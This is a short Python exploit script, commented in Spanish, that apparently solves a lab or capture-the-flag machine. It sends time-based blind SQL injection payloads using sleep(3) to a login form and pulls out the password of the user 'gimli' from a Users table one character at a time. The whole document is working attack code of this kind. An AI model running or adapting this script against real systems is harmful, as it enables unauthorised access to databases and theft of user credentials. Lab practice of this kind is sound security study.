#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
	log.failure("Saliendo")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = 'http://10.10.170.135:1337/978345210/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !"#$%&\'()*+,-./:;<=>?@[]^_'
resultado = ''

def check(payload):
	data_post = {
		'username': '%s' % payload,
		'password': 'test',
		'submit': '+Login+'
	}

	tiempo_inicio = time.time()
	content = requests.post(url, data=data_post)
	tiempo_fin = time.time()

	if tiempo_fin - tiempo_inicio > 3:
		return 1

# Define la base de datos encontrada previamente
bbdd = "Webapp"

# Define la tabla encontrada previamente
tabla = "Users"

# Define el usuario encontrado
usuario = "gimli"

p1 = log.progress("Contraseña")
p2 = log.progress("Payload")

for i in range(1, 40): # Establecemos 40 caracteres para la contraseña por si fuese larga o un hash
	for c in s:
		payload = "' or if(substr((select password from %s where username='%s'),%d,1)=binary(0x%s),sleep(3),1)-- -" % (tabla,usuario,i,c.encode('utf-8').hex())
		p2.status("%s" % payload)
		if check(payload):
			resultado += c
			p1.status("%s" % resultado)
			break

# Histórico con los usuarios encontrados
p1.success("%s" % resultado)
